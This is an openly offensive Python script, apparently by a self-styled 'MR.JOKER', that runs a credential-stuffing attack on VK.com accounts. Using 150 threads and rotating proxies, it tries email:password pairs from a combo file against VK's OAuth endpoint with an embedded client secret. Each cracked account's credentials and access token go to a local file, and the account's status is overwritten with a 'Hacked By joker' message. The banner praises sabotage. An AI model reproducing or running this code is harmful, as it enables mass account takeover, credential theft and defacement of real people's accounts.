try:
	from threading import Lock,Thread
	from requests import get , post
	import time as mm
	import sys as n
	from uuid import uuid4
	from random import choice
	import requests
except Exception as Joker:exit(Joker)
def JOKER(M):
	for c in M + '\n':
		n.stdout.write(c)
		n.stdout.flush()
		mm.sleep(1. / 25)
def vv1ck(*a, **b):
	with Lock():print(*a, **b)
class Brute_Force_Vk_app:
	def __init__(self):
		self.theards =[]
		try:self.file=open(input('\n[+] Enter the name the combo  file: '),'r')
		except FileNotFoundError:vv1ck('\n[-] The file name is incorrect !\n');return Brute_Force_Vk_app()
		try:self.proxy=open(input('\n[+] Enter the name Proxy file: '),'r').read().splitlines()
		except FileNotFoundError:vv1ck('\n[-] The file name is incorrect !\n');return Brute_Force_Vk_app()
		self.User_Agent='com.vk.vkclient/1554 (iPhone, iOS 14.6, iPhone11,2, Scale/3.0)'
		self.Set = "[ Hacked By joker >> IG:@221298 ]"
		self.errorLog='Username or password is incorrect'
		self.TrTs()
	def Edit_Bio(self,token,eml,pess):
		SetBio = get('https://api.vk.com/method/status.set?lang=en&text='+self.Set+'&v=5.179',headers={'Host': 'api.vk.com','Content-Type': 'application/x-www-form-urlencoded; charset=utf-8','Accept-Language': 'ar','Accept': 'image/webp','User-Agent': 'com.vk.vkclient/2990 (iPhone, iOS 14.6, iPhone11,2, Scale/3.0)','Authorization': 'Bearer '+token,'Connection': 'keep-alive'})
		with open('Hacked-VK.txt', 'a') as J:J.write(f'-----------------\nEmail: {eml}\nPassword: {pess}\nToken login: {token}' + '\n')
	def Check_Login(self):
		while True:
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(choice(proxylist))
			all = self.file.readline().split('\n')[0]
			if all == '':exit()
			eml = all.split(':')[0]
			try:pess=all.split(':')[1]
			except IndexError:exit(input())
			try:
				PROXY = {"https":run,"http":run}
				SetLog=get(f'https://api.vk.com/oauth/token?2fa_supported=1&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&device_id={uuid4()}&grant_type=password&password={pess}&scope=all&username={eml}&v=5.145',headers={'Host': 'api.vk.com','Content-Type': 'application/x-www-form-urlencoded; charset=utf-8','Accept': '*/*','User-Agent': self.User_Agent,'Accept-Language': 'en','Connection': 'keep-alive'},proxies=PROXY)
				if ( 'access_token' in SetLog.text ) :
					vv1ck(f'[+] Hacked {eml}:{pess}')
					token=SetLog.json()['access_token']
					self.Edit_Bio(token,eml,pess)
				elif ( self.errorLog in SetLog.text ) :
					vv1ck(f'[-] Not Hacked {eml}:{pess}')
				elif ( 'need_captcha' in SetLog.text ) :
					vv1ck(f'[!] Not Hacked {eml}:{pess}')
				else:
					vv1ck(SetLog.text)
			except KeyboardInterrupt:exit()
			except requests.exceptions.ConnectionError:print('Bad Proxy ..')
	def TrTs(self):
		for i in range(150):
			th1 = Thread(target=self.Check_Login)
			th1.start()
			self.theards.append(th1)
		for th2 in self.theards:
			th2.join()
print("""
		┈┈╱╲┈┈┈╱╲┈┈╭━╮┈
		┈╱╱╲╲__╱╱╲╲┈╰╮┃┈
		┈▏┏┳╮┈╭┳┓▕┈┈┃┃┈ BruteForce VK.com
		┈▏╰┻┛▼┗┻╯▕┈┈┃┃┈   By MR.JOKER
		┈╲┈┈╰┻╯┈┈╱▔▔┈┃┈  Ig: 221298
		┈┈╰━┳━━━╯┈┈┈┈┃┈
		┈┈┈┈┃┏┓┣━━┳┳┓┃┈
		┈┈┈┈┗┛┗┛┈┈┗┛┗┛┈""")
JOKER("""You don't want to help people, you just want to sabotage ,
I agree with you, this is really cool 😍""")
vv1ck("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
Brute_Force_Vk_app()
